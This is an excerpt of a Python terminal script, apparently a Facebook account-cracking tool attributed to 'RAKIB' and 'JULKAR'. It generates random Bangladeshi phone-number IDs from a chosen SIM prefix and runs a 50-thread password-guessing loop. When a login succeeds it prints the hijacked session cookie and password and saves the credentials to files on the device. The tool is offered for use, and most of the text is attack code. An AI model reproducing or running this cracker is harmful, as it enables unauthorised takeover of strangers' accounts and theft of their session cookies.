...
##     ## ##     ## ##    ## #### ########  
\033[1;92m══════════════════════════════════════════
\033[1;91m[\033[1;32m=\033[1;91m]\033[1;32m  TOOLS TYPE\033[1;91m:\033[1;32m PAID X FREE
\033[1;91m[\033[1;32m=\033[1;91m]\033[1;32m  VERSION   \033[1;91m:\033[1;91m 0.8
\033[1;91m[\033[1;32m=\033[1;91m]\033[1;32m\033[1;32m  ADMIN     \033[1;91m:\033[1;32m RAKIB-999
\033[1;91m[\033[1;32m=\033[1;91m]\033[1;32m  GITHUB    \033[1;91m:\033[1;32m RAKIB-999
\033[1;91m[\033[1;32m=\033[1;91m]\033[1;32m  FACEBOOK  \033[1;91m:\033[1;32m MOHAMMAD RAKIB HASAN 
\033[1;92m══════════════════════════════════════════\033[1;92m""")
...
def main():
    ...
    print(f"\033[1;91m[\033[1;32mA\033[1;91m]\033[1;92mRANDOM BD/IND/MIX \033[1;91m[\033[1;32mMIX ID\033[1;91m] ")
    print(f"\033[1;91m[\033[1;32mD\033[1;91m]\033[1;92mCONTACT TO ADMIN  ")
    print(f"\033[1;91m[\033[1;32mE\033[1;91m]\033[1;92mEXIT  ")
    print(f"\033[1;91m[\033[1;32m=\033[1;91m]\033[1;92m_______________________________________   ")
    print("")
    sh = input("\033[0;91m[\033[1;32m=\033[1;91m]\033[1;92mCHOOSE \033[1;91m: ")
    if sh =='A':
       os.system(' ')
       random_apk()
    if sh =='B':
...
def random_apk():
	...
	os.system('clear')
	banner()
	print(f" {H} BD SIM {H}CODE{H}  ");time.sleep(0.05)
	print(f" {H} BD {R}: \033[1;97m017 , 016 , 018 , 019 , 013") 
	
	kode = input(f'{H}  INPUT CODE {R}:{H} ')
	os.system("clear")
	banner()
	doamin = ' \033[1;91m [ \033[1;92m BD/IND/MIX/ID \033[1;91m ]'
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		tl = str(len(user))
		print('══════════════════════════════════════════')
		print('\033[1;91m[\033[1;32m=\033[1;91m]\033[1;92m Total ids\033[1;91m:\033[1;92m '+tl)
		
		print(f'\033[1;91m[\033[1;32m=\033[1;91m]\033[1;92m SIM CODE \033[1;91m:\033[1;92m {kode} ')
		print(f"\033[1;91m[\033[1;32m=\033[1;91m]\033[1;92m Method   \033[1;91m:\033[1;92m {doamin}")
		print('\033[1;91m[\033[1;32m=\033[1;91m]\033[1;92m START BANGLADESH UID CRACKING')
		print('══════════════════════════════════════════')
		for guru in user:
...
def random_gmail():
    ...
    print(f" {K}EXAMPLE : \033[1;97mRakib , JULKAR , Mehedi , Sumaiya , Ridoy") 
...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[1;91m[\033[1;92mRAKIB\033[1;91m]\033[1;91] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\3[1;92m [RAKIB OK🌺]'+cid+' | '+ps+'\[0;92m')
                print(f'\3[1;93m[🌺] COOKIE \033[1;97m : '+coki)
                print(f'\3[1;32m──────────────────────────────────────────────────\3[1;37m')
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/RAKIB-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
       ...
       # sys.stdout.write(f" \r{R} [{B}JULKAR{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[JULKAR] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JULKAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [JULKAR>OK💚] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m [🥪] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JULKAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
...
def fcrack1(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JULKAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
